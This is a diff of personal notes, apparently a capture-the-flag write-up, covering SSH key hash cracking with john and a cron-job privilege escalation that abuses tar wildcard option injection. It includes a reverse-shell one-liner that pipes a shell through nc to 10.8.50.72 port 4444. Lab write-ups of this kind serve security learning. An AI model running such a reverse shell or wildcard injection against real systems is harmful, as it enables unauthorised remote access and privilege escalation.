@@ -63,7 +63,7 @@ python /usr/share/john/ssh2john.py id_rsa > ssh.hash
 
 then crack the hash using john
 
-### Priv esc
+## [[Privilege Escalation]] Cronjon with wildcard
 
 after gettting the hash [[ssh (22 port)]] as the user 
 ```sh
@@ -76,8 +76,6 @@ We don’t have write access to the script.
 The script is backing up our `Documents` folder using `tar` to compress the archive.
 
 Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) what we can do with `tar` confirms that we can exploit it by creating 2 files which names will be interpreted as options passed to the `tar` command.
-
-create a revshell using the pentest monkey revshell.
 
 ```sh
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.50.72 4444 >/tmp/f" > /home/server-management/Documents/rev.sh
